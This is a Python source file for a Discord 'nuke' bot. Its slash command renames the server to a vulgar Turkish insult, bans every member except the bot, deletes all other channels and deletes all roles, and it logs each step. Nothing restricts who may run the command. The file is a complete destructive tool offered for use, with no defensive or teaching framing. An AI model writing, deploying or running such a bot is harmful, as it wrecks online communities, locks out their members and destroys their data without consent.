#Author: hyper
#Date: 11/26/2022

import discord
from discord.ext import commands
from colorama import Fore
from json import load
from datetime import datetime

def init():
    open("log.txt","w").close()

conf = load(open("config.json"))
init()

def append_log(msg: str):
    fd = open("log.txt", "a+")
    fd.write(msg + "\n")
    fd.close()

def log_green(msg: str):
    print(Fore.GREEN + "[SUCCESS] " + Fore.WHITE + msg)
    append_log(msg=f"[{datetime.now().utcnow()}] {msg}")
def log_red(msg: str):
    print(Fore.RED + "[ERROR] " + Fore.WHITE + msg)
    append_log(msg=f"[{datetime.now().utcnow()}] {msg}")

intents = discord.Intents().all()
client = commands.Bot(intents=intents,command_prefix='!')

@client.slash_command()
async def nuke(ctx: discord.ApplicationContext):
    guild = ctx.guild
    channels = ctx.guild.channels
    members = ctx.guild.members
    roles = ctx.guild.roles
    this_channel = ctx.channel
    log_green("Nuking has been started")
    log_green("Guild name: {} | Guild ID: {}".format(guild.name, guild.id))
    log_green("There are {} peoples in this guild.".format(len(guild.members)))
    log_green("There are {} channels in this guild.".format(len(guild.channels)))
    await ctx.respond("Nuking started!")        
    await guild.edit(name="hyper siker atar")
    for i in members:
        try: 
            if i != client.user:
                await i.ban() 
                log_green("{} just banned!".format(i))
        except: 
            log_red("An error occured while banning an user!")
    for i in channels:
        if i != this_channel:
            try: 
                await i.delete()
                log_green("{} just deleted!".format(i.name))
            except: 
                log_red("An error occured while deleting channel!")
    for i in roles: 
        try: 
            await i.delete()
            log_green("{} just deleted!".format(i.name))
        except: 
            log_red("An error occured while deleting role!")
    log_green("Nuking ended")


@client.event
async def on_ready():
    log_green("Bot has been started: {}".format(client.user))



client.run(conf["token"])